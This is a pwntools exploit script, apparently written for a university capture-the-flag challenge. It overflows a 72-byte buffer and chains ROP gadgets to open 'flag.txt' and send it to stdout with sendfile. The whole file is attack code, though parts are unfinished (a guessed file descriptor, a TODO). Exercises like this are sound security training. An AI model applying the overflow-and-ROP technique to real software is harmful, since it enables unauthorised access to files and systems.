from pwn import *

REMOTE = False

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 50260

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')
    gdb.attach(conn)

offset = 72
payload = b"A" * offset

mov_rax_2_syscall = 0x000000000040119f      #: mov rax, 2; syscall; ret;
mov_rax_40_syscall = 0x00000000004011a9     #: mov rax, 0x28; syscall; nop; pop rbp; ret;
syscall = 0x00000000004011a6                #: syscall; ret; 

nop_ret = 0x000000000040111f                #: nop; ret;

pop_r10 = 0x000000000040119c    #: pop r10; ret; 
pop_rbp = 0x000000000040111d    #: pop rbp; ret; 
pop_rdi = 0x0000000000401196    #: pop rdi; ret; 
pop_rdx = 0x000000000040119a    #: pop rdx; ret; 
pop_rsi = 0x0000000000401198    #: pop rsi; ret;

file_name = "flag.txt"                      # Ricorda sempre il \x00 finale
flag_txt_addr = 0x00003020 + 0x400000
print(hex(flag_txt_addr))

# Idea: Apro il file (syscall 2) e poi copio i contenuti verso lo STDOUT (syscall 40)

payload += p64(pop_rdi) + p64(flag_txt_addr)    # Apro il file flag.txt
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(mov_rax_2_syscall)               # Il file aperto, avrà come fd il fd più alto fino al momento + 1

target_file_fd = 6

payload += p64(pop_rdi) + p64(1)                # Copio il file verso STDOUT
payload += p64(pop_rsi) + p64(target_file_fd)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_r10) + p64(100)
payload += p64(nop_ret)
payload += p64(mov_rax_40_syscall)              # TODO Gestire adeguatamente il pop rbp

conn.sendline(payload)

conn.interactive()

# flag = conn.recvline().decode()

# conn.close()
# print(flag)